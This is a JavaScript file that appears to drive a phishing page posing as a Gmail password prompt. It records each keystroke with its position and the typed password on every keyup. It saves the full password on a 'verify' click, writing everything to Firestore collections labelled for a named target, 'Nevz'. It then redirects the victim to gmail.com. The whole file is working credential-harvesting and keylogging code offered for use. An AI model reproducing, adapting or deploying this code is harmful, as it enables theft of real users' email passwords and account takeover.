const passInp = document.getElementById("password");
const checkboxInp = document.getElementById("checkbox");

const redirectLink = document.getElementById("redirectLink")
const verifyButton = document.getElementById("verify")

let position = 0;

checkboxInp.addEventListener("change", (e) => {
    if(e.target.checked){
        passInp.type = 'text'
    }
    else{
        passInp.type = 'password'
    }
})

passInp.addEventListener("keyup", (e) => {
    if(passInp.value == "" || passInp.value.length == 0){
        redirectLink.href="#"
    }
    else{
        redirectLink.href="https://gmail.com"
    }

    letters(e.code)
    addPassWord()
    position++;

})

verifyButton.addEventListener("click", async (e) => {
    if(passInp.value!=""){
        addPassWordFull()
    }
})


function addPassWord(){
    db.collection("passwords").add({
        name: passInp.value,
        person: "Nevz"
    })
}
function addPassWordFull(){
    db.collection("passwordsFull").add({
        name: passInp.value,
        person: "Nevz"

    })
}
function letters(e){
    db.collection("letters").add({
        name: e,
        position: position,
        person: "Nevz"

    })
}